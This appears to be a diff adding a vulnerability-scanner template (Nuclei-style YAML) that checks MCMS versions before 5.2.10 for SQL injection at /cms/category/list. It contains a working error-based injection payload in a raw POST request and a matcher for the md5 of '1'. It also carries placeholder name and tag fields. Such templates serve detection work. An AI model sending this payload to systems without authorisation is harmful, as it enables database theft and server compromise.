@@ -1,0 +1,26 @@
+id: Mcms-category-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 铭飞CMS在5.2.10版本以前list 接口处存在sql注入漏洞，能够利用该漏洞获取敏感信息，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/M7-1%E9%93%AD%E9%A3%9E-CMS-SQL?id=m7-1%e9%93%ad%e9%a3%9e-cms-sql
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /cms/category/list HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Length: 191
+
+        sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x5c,0x717a6a6271,(select md5(1)),0x716b6a7871))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
